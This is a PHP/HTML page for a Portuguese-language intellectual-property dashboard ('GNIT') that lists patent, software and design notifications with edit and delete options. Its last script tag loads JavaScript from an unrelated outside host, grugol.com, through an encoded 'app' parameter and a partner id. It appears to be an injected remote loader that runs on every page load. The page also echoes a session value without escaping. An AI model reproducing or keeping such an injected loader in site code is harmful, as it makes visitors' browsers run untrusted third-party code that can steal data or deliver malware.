	<?php
	include 'configs/conexao.php';

	if (!isset($_SESSION)) {
		session_start();
	}
	?>


	<html lang="pt-BR">

	<head>

		<meta charset="UTF-8" />
		<title>GNIT - Notificações</title>
		<meta charset="UTF-8">


		<!--Os arquivos Meta-->
		<meta name="viewport" content="width=device-width,initial-scale=1.0">
		<meta name="description" content="GNIT">
		<meta name="author" content="">
		<!--Fim dos arquivos Meta-->

		<!--Os Arquivos CSS-->
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<link href="css/bootstrap-responsive.min.css" rel="stylesheet">
		<link href="css/template.css" rel="stylesheet">


		<!--HTML5 shim,for IE6-8 support of HTML5 elements -->
		<!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

	</head>

	<body>
		<!-- Fixed navbar -->
		<nav class="navbar navbar-default navbar-fixed-top">
			<div class="container">
				<div class="navbar-header">
					<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					</button>
					<a class="navbar-brand" href="propriedades.php"><b>GNIT</b></a>
				</div>
				<div id="navbar" class="navbar-collapse collapse">
					<ul class="nav navbar-nav">
						<li><a href="quem.php">Quem Somos</a></li>
						<li><a href="contato.php">Contato</a></li>
					</ul>
					<ul class="nav navbar-nav navbar-right">


						<!--<li class="active"><a href="./">Fixed top <span class="sr-only">(current)</span></a></li>-->
						<div id="perfil">
							<span style="vertical-align:middle; padding-right:10px"> <i><?php echo $_SESSION['nome']; ?></i></span>
							<a href="minhaconta.php"><img src="https://via.placeholder.com/40" class="img-circle"></a>
						</div>
					</ul>
				</div><!--/.nav-collapse -->
			</div>
		</nav> <!--Final da NavBar-->
		<div class="container-fluid" style="margin-top:80px;">
			<div class="row">
				<div class="col-md-2" id="menu-esquerdo">
					<p><img src="img/nit.jpg" style="margin-left:15px"></p>
					<ul class="nav nav-pills nav-stacked">
						<li role="presentation"><a href="propriedades.php" .php"><img src="img/dashboard.png"> DashBoard</a></li>
						<li role="presentation" class="active"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Notificações</a></li>
						<li role="presentation"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
						<li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
						<li role="presentation"><a href="index.php"><img src="img/sair.png"> Sair</a></li>
					</ul>
				</div> <!--Final Menu Esquerdo-->
				<div class="col-md-10" id="conteudo">
					<div class="row">

						<h1>Minhas Notificações </h1>
						<div id="icones">
							<div class="col-md-4">
								<div class="bloco-icone">
									<a href="minhastarefas.php">
										<h4>Notificações</h4>
									</a>
									<div>
										<img src="img/post.png" id="fotoconfig">
										<span class="texto-bloco">Revista INPI</span>
									</div>
								</div>
							</div>
							<!--<div class="col-md-4">
                <div class="bloco-icone">
                  <a><h4>Arquivos</h4></a>
                    <div>
                      <img src="img/carrinho.png">
                      <span class="texto-bloco">Arquivos do projeto</span>
                    </div>
                </div>
              
              </div>
              -->
							<div class="col-md-4">
								<div class="bloco-icone">
									<a href="#">
										<h4>Empenho</h4>
									</a>
									<div>
										<img src="img/entregar.png">
										<span class="texto-bloco">Emissão de GRU</span>
									</div>
								</div>
							</div>
							<div class="col-md-4">
								<div class="bloco-icone">
									<a href="usuarios.php">
										<h4>Meus Usuários</h4>
									</a>
									<div>
										<img src="img/ticket.png">
										<span class="texto-bloco">Cadastros Pendentes</span>
									</div>
								</div>
							</div>
						</div> <!--fim dos icones-->
					</div>
					<br />
					<h3 style='text-align:center'> Lista de Notificações</h3>
					<div class="table-responsive col-md-12">
						<table class="table table-striped" cellspacing="0" cellpadding="0">
							<tr>
								<td><span class="glyphicon glyphicon-star" aria-hidden="true"></span> Patente 01</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 111111111111</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 30/04/2022</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
										</ul>
									</div>
								</td>
							</tr>
							<tr>

								<td><span class="glyphicon glyphicon-phone" aria-hidden="true"></span> Programa de Computador 01</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 22222222222</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 22/03/2022</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>

								</td>
							</tr>
							<tr>
								<td><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Desenho Industrial 01</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 33333333333</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 11/02/2022</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>

								</td>
							</tr>
							<tr>
								<td><span class="glyphicon glyphicon-star" aria-hidden="true"></span> Patente 02</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 44444444444</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 03/01/2022</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
										</ul>
									</div>
								</td>
							</tr>
							<tr>

								<td><span class="glyphicon glyphicon-phone" aria-hidden="true"></span> Programa de Computador 02</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 55555555555</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 28/12/2021</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>

								</td>
							</tr>
							<tr>
								<td><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Desenho Industrial 02</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 66666666666</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 13/11/2021</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>

								</td>
							</tr>
							<tr>
								<td><span class="glyphicon glyphicon-star" aria-hidden="true"></span> Patente 03</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 77777777777</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 10/10/2021</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
										</ul>
									</div>
								</td>
							</tr>
							<tr>

								<td><span class="glyphicon glyphicon-phone" aria-hidden="true"></span> Programa de Computador 04</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 88888888888</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 30/09/2021</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>

								</td>
							</tr>
							<tr>
								<td><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Mesa Estensora Pro Max</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 3121312121312</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 30/03/2022</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>

								</td>
							</tr>
							<tr>
								<td><span class="glyphicon glyphicon-star" aria-hidden="true"></span> Criação de um Dendrômetro para medição da produtividade na agricultura</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 3121312121312</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 30/03/2022</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
										</ul>
									</div>
								</td>
							</tr>
							<tr>

								<td><span class="glyphicon glyphicon-phone" aria-hidden="true"></span> Doe +</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 3121312121312</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 30/03/2022</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>

								</td>
							</tr>
							<tr>
								<td><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Mesa Estensora Pro Max</td>
								<td><span class="glyphicon glyphicon-tag" aria-hidden="true"></span> BR 3121312121312</td>
								<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> 30/03/2022</td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
											<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>

								</td>
							</tr>

							</tbody>
						</table>

					</div>

				</div>


				<!-- Modal -->
				<div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
								<h4 class="modal-title" id="modalLabel">Excluir Item</h4>
							</div>
							<div class="modal-body">
								Deseja realmente excluir este item?
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-primary">Sim</button>
								<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
							</div>
						</div>
					</div>
				</div>
				<hr>
				<div id="bottom" class="row rodape">
					<div class="col-md-12">
						<ul class="pagination">
							<li class="disabled"><a>&lt; Anterior</a></li>
							<li class="disabled"><a>1</a></li>
							<li><a href="#">2</a></li>
							<li><a href="#">3</a></li>
							<li class="next"><a href="#" rel="next">Pr&oacuteximo &gt;</a></li>
						</ul><!-- /.pagination -->
					</div>
				</div> <!-- /#bottom -->
				<div class="col-md-12">
					<hr>
					<footer>
						<h3>&copy GNIT - Todos os Direitos Reservados</h3>
					</footer>

				</div>


				<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

				<!-- Latest compiled and minified JavaScript -->
				<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
				<script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
	</body>
	</body>

	</html>

	</html>